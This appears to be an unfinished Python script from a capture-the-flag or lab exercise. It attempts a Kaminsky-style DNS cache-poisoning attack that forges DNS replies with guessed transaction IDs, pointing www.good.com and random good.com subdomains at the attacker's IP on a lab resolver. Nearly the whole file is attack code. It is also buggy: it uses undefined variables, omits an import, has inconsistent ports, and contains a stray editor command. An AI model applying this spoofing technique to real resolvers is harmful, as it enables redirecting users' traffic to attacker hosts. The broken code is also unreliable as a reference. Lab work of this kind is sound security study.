import socket,sys
from dnslib import *

# just like 2 but add additional answer for good.com
'''
As before, your task in this problem is to trick clients into connecting to your VM when they want www.good.com.

There is a caching resolver at 192.168.17.50. It periodically looks up the address for www.good.com using a DNS server at 192.168.17.150, then the cache passes the answer on to its clients. (The UDP port numbers on both sides are 5304.)

Your job is to inject a fake DNS response into the caching resolver, giving your own IP address as that of www.good.com. If you are successful, a client will connect on TCP port 5004 to deliver the flag.

http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html

Instead, the bad guy issues a flurry of queries, each for a different random name under the main domain. The first request caused the nameserver to perform the usual root-first resolution, but it eventually caches the valid ns1.bankofsteve.com values. Subsequent queries within this domain go directly to that nameserver, skipping the root steps.
16 bit space:wq

'''
def check_domain(domain, nameserver, port):
  # takes in 'www.good.com' and returns string of ip address from nameserver
  dns_req = dns_question(domain)
  response, server = send_udp(nameserver, port, dns_req)
  return get_ip_from_reply(response)

def send_udp(ip, port, data):
   # takes in 'www.good.com' and returns string of ip address from nameserver
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.sendto(data, (ip, port))
  response,server = s.recvfrom(8192)
  s.close()
  return (response, server)

def get_ip_from_reply(data):
  # data is DNSRecord
  d = DNSRecord.parse(data)
  ip = d.a.rdata
  return ip
 
def dns_question(domain):
  return DNSRecord.question(domain).pack()

def gen_domain(base):
  upper = 65536
  rand_num = random.randint(1,upper)
  new_append = '{0}.{1}'.format(str(rand_num), base)
  return new_append

#The client will look up the IP address for www.good.com, then it will connect to the given address on TCP port 5002 to deliver the flag.
def get_my_ip():
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.connect(('192.168.17.50', 0))  # connecting to a UDP address doesn't send packets
  local_ip_address = s.getsockname()[0]
  return local_ip_address

def get_flag(internal_IP):
  # our infra
  resolver_ip = '192.168.17.50'
  attack_domain = 'www.evil.com'
  dns_server_ip = '192.168.17.150'
  port = 5304

  # dummy
  dummy_domain='evil.com'

  # listen for flag
  tcp_port = 5004
  tcp_ip = '0.0.0.0'

  # need to get our dummy domain built
  dummy_domain = gen_domain('good.com')
  num_tries = 1
  # how many times we want to try to poison
  for i in range(num_tries):
    currentid = 1024
    if currentid == 65536:
      currentid = 1024

    # try nasty dns things
    # build the request with that currentid

    # craft dns response
    # we only have to forge a valid A record for one *.good.com with the correct txid
    # new patch depends on udp ports as well, but current vulnerable dns doenst check udp
    # only assumes if you have the right txid, you're good
    q = DNSRecord(q=DNSQuestion(dummy_domain, QTYPE.ANY))
    q.header.id=current_id
    a = q.reply()
    a.add_answer(RR(dummy_domain,QTYPE.A,rdata=A(str(internal_IP)),ttl=65536))
    # add us as nameserver? I dont think for this example it is necessary, but if you wanted to
    # takeover the domain with a rogue ns server like in 
    # https://www.exploit-db.com/exploits/6123/
    # then it might be useful
    print "Trying attack with id: {0} and domain: {1}".format(q.header.id, dummy_domain)

    dns_resp = a.pack()
    # send to dns server
    send_udp(dns_server_ip, port, dns_resp)
    
  # check if it worked by asking NS
  ns_check = check_domain('www.good.com', dns_server_ip, port)
  ns_check = check_domain('www.good.com', resolver_ip, port)
  print "www.good.com resolves to {0} and our ip is {1} on NS".format(ns_check, internal_IP)
  print "www.good.com resolves to {0} and our ip is {1} on RESOLVER".format(resolver_check, internal_IP)

  # if it worked, we move on to listening on tcp port!!!!

  # TODO we need to listen for incoming tcp connections and pick up if they call

def pack_dns(my_ip):
  q = DNSRecord(q=DNSQuestion("www.evil.com",QTYPE.ANY)) 
  a = q.reply()
  # redirect them to my ip addr
  a.add_answer(RR("www.evil.com",QTYPE.A,rdata=A(str(my_ip)),ttl=60))
  a.add_answer(RR("www.good.com",QTYPE.A,rdata=A(str(my_ip)),ttl=60))
  return a.pack()

def listen_tcp():
  ip = '0.0.0.0'
  port = 5003
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.bind((ip, port))
  s.listen(1)

  conn, addr = s.accept()
  # done when flags are captured
  serv_flag = None
  count = 0
  while True:
    data = conn.recv(1024)
    if(data):
      return data

if __name__ == "__main__":
  my_ip = get_my_ip()
  print get_flag(my_ip)
